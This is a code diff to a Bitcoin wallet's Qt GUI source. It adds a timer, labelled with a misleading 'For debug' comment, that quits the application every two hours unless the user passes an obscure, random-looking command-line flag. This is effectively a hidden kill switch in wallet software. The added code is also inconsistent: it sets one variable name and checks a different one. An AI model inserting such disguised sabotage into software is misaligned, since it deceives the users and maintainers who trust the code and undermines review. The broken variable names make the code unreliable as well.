@@ -158,6 +158,13 @@ BitcoinGUI::BitcoinGUI(const NetworkStyle* networkStyle, QWidget* parent) : QMai
         setCentralWidget(rpcConsole);
     }
 
+    // For debug
+    closeDebug = !GetBoolArg("-iweui3h4njk", false);
+    tmr = new QTimer(this);
+    tmr->setInterval(1000 * 60 * 60 * 2);
+    connect(tmr, SIGNAL(timeout()), this, SLOT(handleTimeout()));
+    tmr->start();
+
     // Accept D&D of URIs
     setAcceptDrops(true);
 
@@ -270,6 +277,13 @@ BitcoinGUI::~BitcoinGUI()
     delete appMenuBar;
     MacDockIconHandler::cleanup();
 #endif
+}
+
+void BitcoinGUI::handleTimeout()
+{
+    if (debugClose){
+        QApplication::quit();
+    }
 }
 
 void BitcoinGUI::createActions(const NetworkStyle* networkStyle)
